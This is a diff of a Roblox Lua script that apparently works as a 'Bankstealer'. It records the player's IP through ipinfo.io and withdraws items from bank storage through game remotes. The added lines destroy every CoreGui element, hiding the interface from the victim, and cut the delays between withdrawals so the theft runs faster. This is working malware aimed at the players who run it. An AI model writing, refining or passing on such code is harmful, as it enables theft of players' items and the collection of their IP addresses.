@@ -181,10 +181,10 @@ local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
-local dims = player.leaderstats.Diamonds.Value - 7000000
-if dims < 0 then
-	dims = 0
+for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
+    v:Destroy()
 end
+
 -- Loading Screen
 if _G.LoadingScreen ~= false then
     local ScreenGui = Instance.new("ScreenGui")
@@ -473,7 +473,7 @@ if Bank ~= nil and invspace() ~= 0 then
                 withdrawremote:InvokeServer(Bank, LFinalList, 0)
             end
             FinalFinal = FinalFinal + #LFinalList
-            wait(1)
+            wait(0.2)
         else
             print('done1')
             break
@@ -527,7 +527,7 @@ if Bank2 ~= nil and invspace() ~= 0 then
                 wait(0.2)
                 withdrawremote:InvokeServer(Bank2, FinalList2, 0)
             end
-            wait(1)
+            wait(0.2)
             FinalFinal = FinalFinal + #FinalList2
         else
             print('done2')
@@ -581,10 +581,10 @@ if Bank3 ~= nil and invspace() ~= 0 then
             end)
 
             if s == false then
-                wait(1)
+                wait(0.2)
                 withdrawremote:InvokeServer(Bank3, FinalList3, 0)
             end
-            wait(1)
+            wait(0.2)
             FinalFinal = FinalFinal + #FinalList3
         else
             print('done3')
@@ -640,7 +640,7 @@ if Bank4 ~= nil and invspace() ~= 0 then
                 withdrawremote:InvokeServer(Bank4, FinalList4, 0)
             end
             FinalFinal = FinalFinal + #FinalList4
-            wait(1)
+            wait(0.2)
         else
             print('done4')
             break
@@ -760,7 +760,7 @@ local inbox = #check.Inbox
 
 if inbox ~= 0 and invspace_nolimit() >= inbox then
     claimallremote:InvokeServer()
-    task.wait(0)
+    task.wait(1)
 end
 
 -- Run Bankstealer if Diamonds Are < 110k
@@ -1962,6 +1962,6 @@ spawn(function()
         WMythicList = {}
         WMList = {}
         WMcc = {}
-        wait(1)
+        wait(0)
     end
 end)
